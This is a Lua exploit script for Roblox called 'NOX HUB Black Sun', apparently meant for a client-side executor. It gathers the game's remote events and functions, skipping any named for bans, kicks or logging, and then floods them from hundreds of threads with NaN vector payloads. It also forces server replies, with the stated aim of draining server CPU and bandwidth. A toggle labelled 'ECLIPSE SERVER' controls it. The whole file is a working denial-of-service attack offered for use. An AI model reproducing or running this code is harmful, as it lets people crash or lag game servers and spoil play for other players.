--[[
    🔱 NOX HUB v18.0 [BLACK-SUN] 🔱
    "Eclipse the network. Shut out the light."
    
    BLACK SUN FEATURES:
    - [DUAL-FLOW ENGINE] : Attacks both Upload (Send) and Download (Receive) channels.
    - [SERVER FORCING] : Uses RemoteFunctions to FORCE the server to reply (CPU/Bandwidth cost).
    - [SMART FILTERING] : Inherits v17's auto-purge for blocked remotes.
    - [PULSE UI] : Visualizes the heartbeat of the attack.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. BLACK SUN ENGINE //
local Engine = {
    Active = false,
    Events = {},     -- Send (FireServer)
    Functions = {},  -- Receive (InvokeServer)
    Stats = {
        Sent = 0,
        Received = 0,
        Blocked = 0
    }
}

function Engine:Scan()
    Engine.Events = {}
    Engine.Functions = {}
    Engine.Stats = {Sent=0, Received=0, Blocked=0}
    
    for _, v in pairs(game:GetDescendants()) do
        local n = v.Name:lower()
        if not (n:find("ban") or n:find("kick") or n:find("punish") or n:find("log")) then
             if v:IsA("RemoteEvent") then
                table.insert(Engine.Events, {Inst = v, Active = true})
             elseif v:IsA("RemoteFunction") then
                table.insert(Engine.Functions, {Inst = v, Active = true})
             end
        end
    end
end

function Engine:Engage()
    if Engine.Active then return end
    Engine.Active = true
    
    Engine:Scan()
    if #Engine.Events == 0 and #Engine.Functions == 0 then return end
    
    local Payload = table.create(50, Vector3.new(0/0, 0/0, 0/0)) -- NaN
    
    game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="BLACK SUN RISING..."})
    
    -- THREAD GROUP A: UPLOAD (FIRE EVENTS)
    for i = 1, 150 do
        task.defer(function()
            while Engine.Active do
                for _, t in ipairs(Engine.Events) do
                    if t.Active then
                        local s, e = pcall(function() t.Inst:FireServer(Payload) end)
                        if s then 
                            Engine.Stats.Sent = Engine.Stats.Sent + 1 
                        else 
                            t.Active = false 
                            Engine.Stats.Blocked = Engine.Stats.Blocked + 1
                        end
                    end
                end
                if i % 25 == 0 then RunService.Heartbeat:Wait() end
            end
        end)
    end
    
    -- THREAD GROUP B: DOWNLOAD (INVOKE FUNCTIONS)
    -- This forces the server to REPLY.
    for i = 1, 100 do
        task.defer(function()
            while Engine.Active do
                for _, t in ipairs(Engine.Functions) do
                    if t.Active then
                        -- We spawn this so we don't wait for the reply, we just demand it.
                        task.spawn(function()
                            local s, e = pcall(function() 
                                t.Inst:InvokeServer(Payload) 
                                -- If we reach here, server replied!
                                Engine.Stats.Received = Engine.Stats.Received + 1
                            end)
                            if not s then
                                t.Active = false
                                Engine.Stats.Blocked = Engine.Stats.Blocked + 1
                            end
                        end)
                    end
                end
                RunService.Heartbeat:Wait() -- Slower tick for invokes to prevent client lag
            end
        end)
    end
end

function Engine:Stop()
    Engine.Active = false
end

-- // 2. BLACK SUN UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxBlackSun"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 480, 0, 320)
    Main.Position = UDim2.new(0.5, -240, 0.5, -160)
    Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Main.BorderSizePixel = 2
    Main.BorderColor3 = Color3.fromRGB(255, 200, 50) -- Solar Gold
    
    -- ECLIPSE IMAGE
    local Eclipse = Instance.new("ImageLabel", Main)
    Eclipse.Size = UDim2.new(0, 200, 0, 200)
    Eclipse.Position = UDim2.new(0.5, -100, 0.5, -120)
    Eclipse.Image = "rbxassetid://6015897843" -- Circle Shadow
    Eclipse.ImageColor3 = Color3.fromRGB(255, 180, 0)
    Eclipse.BackgroundTransparency = 1
    
    local EclipseCore = Instance.new("Frame", Eclipse)
    EclipseCore.Size = UDim2.new(0.9, 0, 0.9, 0)
    EclipseCore.Position = UDim2.new(0.05, 0, 0.05, 0)
    EclipseCore.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    EclipseCore.BorderSizePixel = 0
    local C = Instance.new("UICorner", EclipseCore)
    C.CornerRadius = UDim.new(1, 0)
    
    -- HEADER
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // BLACK SUN v18.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 200, 50)
    Title.TextSize = 24
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.BackgroundTransparency = 1
    
    -- METERS
    local function CreateMeter(name, color, pos)
        local f = Instance.new("Frame", Main)
        f.Size = UDim2.new(0.4, 0, 0.15, 0)
        f.Position = UDim2.new(pos, 0, 0.6, 0)
        f.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        f.BorderSizePixel = 1
        f.BorderColor3 = color
        
        local l = Instance.new("TextLabel", f)
        l.Text = name
        l.Size = UDim2.new(1, 0, 0.5, 0)
        l.TextColor3 = color
        l.Font = Enum.Font.GothamBold
        l.TextSize = 12
        l.BackgroundTransparency = 1
        
        local v = Instance.new("TextLabel", f)
        v.Text = "0"
        v.Size = UDim2.new(1, 0, 0.5, 0)
        v.Position = UDim2.new(0, 0, 0.5, 0)
        v.TextColor3 = Color3.fromRGB(255, 255, 255)
        v.Font = Enum.Font.Code
        v.TextSize = 16
        v.BackgroundTransparency = 1
        
        return v
    end
    
    local ValSent = CreateMeter("UPLOAD (FIRE)", Color3.fromRGB(255, 50, 50), 0.05)
    local ValRecv = CreateMeter("DOWNLOAD (INVOKE)", Color3.fromRGB(50, 150, 255), 0.55)
    
    task.spawn(function()
        while Main.Parent do
            ValSent.Text = math.floor(Engine.Stats.Sent/1000) .. "k Pkts"
            ValRecv.Text = math.floor(Engine.Stats.Received) .. " Pkts"
            
            if Engine.Active then
                Eclipse.ImageColor3 = Color3.fromRGB(255, 50, 50) -- Angry Sun
            else
                Eclipse.ImageColor3 = Color3.fromRGB(255, 200, 50) -- Idle Sun
            end
            wait(0.2)
        end
    end)

    -- BUTTON
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.6, 0, 0.2, 0)
    Btn.Position = UDim2.new(0.2, 0, 0.8, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Btn.Text = "ECLIPSE SERVER"
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamBold
    Btn.TextSize = 20
    Btn.BorderSizePixel = 2
    Btn.BorderColor3 = Color3.fromRGB(255, 200, 50)
    
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Active then
            Engine:Engage()
            Btn.Text = "STOP ECLIPSE"
            Btn.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
            Btn.BorderColor3 = Color3.fromRGB(255, 50, 50)
        else
            Engine:Stop()
            Btn.Text = "ECLIPSE SERVER"
            Btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            Btn.BorderColor3 = Color3.fromRGB(255, 200, 50)
        end
    end)
    
     -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
